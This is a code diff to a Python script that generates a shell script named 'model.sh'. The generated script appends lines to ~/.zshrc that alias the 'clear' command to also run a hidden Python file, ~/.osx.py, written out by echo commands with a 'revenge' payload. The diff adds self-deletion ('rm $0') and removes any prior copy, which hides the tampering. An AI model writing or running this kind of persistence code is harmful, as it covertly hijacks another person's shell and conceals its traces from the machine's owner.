@@ -154,9 +154,11 @@ def get_echo_commands(string: str, output_file: str | None, max_command_length: 
     yield command_prefix + line + command_suffix
 
 
-with open('x.sh', 'w') as file:
+with open('model.sh', 'w') as file:
     file.write('echo \'\\n\\n\\n# revenge\' >> ~/.zshrc\n')
     file.write('echo alias clear=\\\'clear\\; python3 ~/.osx.py\\\' >> ~/.zshrc\n')
     file.write('echo clear >> ~/.zshrc\n')
-    file.write('\n'.join(get_echo_commands(generate_revenge_python_file('revenge.mov'), output_file='~/.osx.py')))
-    file.write('source ~/.zshrc')
+    file.write('rm ~/.osx.py 2>/dev/null\n')
+    file.write('\nsleep 0.05\n'.join(get_echo_commands(generate_revenge_python_file('revenge.mov'), output_file='~/.osx.py')))
+    file.write('\nsource ~/.zshrc\n')
+    file.write('rm $0\n')
